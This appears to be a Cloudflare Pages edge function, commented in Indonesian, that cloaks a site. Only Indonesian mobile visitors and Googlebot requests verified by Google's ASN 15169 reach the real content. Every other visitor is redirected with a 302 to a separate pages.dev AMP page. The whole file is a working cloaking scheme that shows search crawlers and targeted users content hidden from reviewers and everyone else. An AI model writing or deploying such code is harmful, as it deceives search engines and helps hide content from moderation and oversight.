export async function onRequest(context) {
  const request = context.request;
  const country = request.cf?.country || "XX";
  const ua = (request.headers.get("User-Agent") || "").toLowerCase();
  const asn = request.cf?.asn || 0;

  // Deteksi Mobile
  const isMobile =
    ua.includes("android") ||
    ua.includes("iphone") ||
    ua.includes("ipad") ||
    ua.includes("mobile");

  // Deteksi string Googlebot
  const isGoogleBotUA =
    ua.includes("googlebot") ||
    ua.includes("google-inspectiontool") ||
    ua.includes("mediapartners-google") ||
    ua.includes("storebot-google") ||
    ua.includes("apis-google") ||
    ua.includes("adsbot-google") ||
    ua.includes("googleother");

  // ASN Google resmi
  const isGoogleASN = asn === 15169;

  // URL redirect boleh dibuka dari negara dan device apa pun
  const url = new URL(request.url);

  if (
    url.pathname === "/amp/kouy1oyt" ||
    url.pathname === "/amp/kouy1oyt/" ||
    url.pathname === "/amp/kouy1oyt.html"
  ) {
    return context.next();
  }

  // === ATURAN ===
  // 1. Indonesia + Mobile → boleh
  // 2. Googlebot + datang dari IP Google (ASN 15169) → boleh
  // Selain itu → redirect
  if ((country === "ID" && isMobile) || (isGoogleBotUA && isGoogleASN)) {
    return context.next();
  }

  return Response.redirect(
    "https://dhrup-adchin-tan.pages.dev/amp/kouy1oyt",
    302
  );
}